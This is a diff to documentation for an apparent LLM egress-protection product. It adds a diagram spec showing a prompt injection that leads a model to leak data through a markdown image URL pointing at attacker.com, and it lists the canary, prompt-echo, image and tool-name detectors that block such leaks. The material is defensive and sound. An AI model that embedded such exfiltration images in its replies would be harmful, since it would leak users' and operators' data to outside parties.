@@ -13,6 +13,60 @@ Egress protection stops a model from giving away its system prompt, sending data
 
 Theorem reads what the model writes at the outbound boundaries (`reply`, `reply_structured`, `live_reply`, `thought`) and, for some detectors, the arguments of its tool calls. It uses canary tokens, prompt echo detection, image and link checks, and tool name checks.
 
+```figure
+{
+  "kind": "lanes",
+  "still": {
+    "src": "/imagery/th30_tidalmudflats.png",
+    "position": "50% 50%"
+  },
+  "caption": "A reply tries to send data out through an image. Set ungiven_images to block, and the browser never loads it.",
+  "lanes": [
+    "The model",
+    "Theorem",
+    "The person"
+  ],
+  "steps": [
+    {
+      "lane": "The model",
+      "label": "![preview](https://attacker.com/leak?data=…)",
+      "text": "An injection steered the model to put data in an image address. A browser would load it with no click.",
+      "kind": "model"
+    },
+    {
+      "lane": "Theorem",
+      "label": "reply",
+      "text": "Detectors read what the model writes at the outbound boundaries.",
+      "kind": "guardrail",
+      "parts": [
+        {
+          "label": "ungiven_images",
+          "text": "An image at an address the model was not given."
+        },
+        {
+          "label": "canary_leak",
+          "text": "The secret token in the system prompt."
+        },
+        {
+          "label": "prompt_leak",
+          "text": "A run of 12 or more words from the private prompt."
+        },
+        {
+          "label": "tool_leak",
+          "text": "The profile's tool and parameter names."
+        }
+      ]
+    },
+    {
+      "lane": "The person",
+      "label": "block stops the reply",
+      "text": "It never reaches the client. By default ungiven_images flags the image instead.",
+      "kind": "egress"
+    }
+  ]
+}
+```
+
 ## The Egress Threat Model
 
 Model output has three main ways to leak:
